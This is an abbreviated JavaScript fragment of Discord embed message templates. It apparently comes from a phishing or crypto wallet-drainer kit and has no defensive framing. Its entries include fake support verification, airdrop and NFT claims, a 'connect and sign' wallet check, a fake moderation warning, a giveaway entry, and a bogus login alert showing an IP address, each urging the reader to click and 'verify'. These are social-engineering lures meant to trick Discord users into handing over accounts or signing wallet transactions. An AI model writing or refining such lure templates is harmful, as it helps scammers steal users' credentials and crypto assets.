  ...
  verify_support: {
    embed: {
      ...
      description:
        ...
        `🔗 Click here to verify your support session.\n\n` +
  ...
  airdrop_claim: {
    embed: {
      ...
      description:
        ...
        `🔗 Click here to verify and claim your drop.`,
  ...
  wallet_check: {
    embed: {
      ...
      description:
        ...
        `🔗 Click to connect and sign to verify ownership.\n\n` +
  ...
  moderation_warning: {
    embed: {
      ...
      description:
        ...
        `🔗 Click to confirm your identity and resolve the issue.`,
  ...
  nft_claim: {
    embed: {
      ...
      description:
        ...
        `🔗 Click here to verify and claim your NFT drop.`,
  ...
  giveaway_entry: {
    embed: {
      ...
      description:
        ...
        `🔗 Click here to verify your eligibility and lock your entry.`,
  ...
  login_issue: {
    embed: {
      ...
      description:
        ...
        `📍 IP: 192.168.0.248\n` +
        `🌐 Region: Unknown\n\n` +
        `⚠️ If this wasn’t you, please verify your identity to secure your account.`,
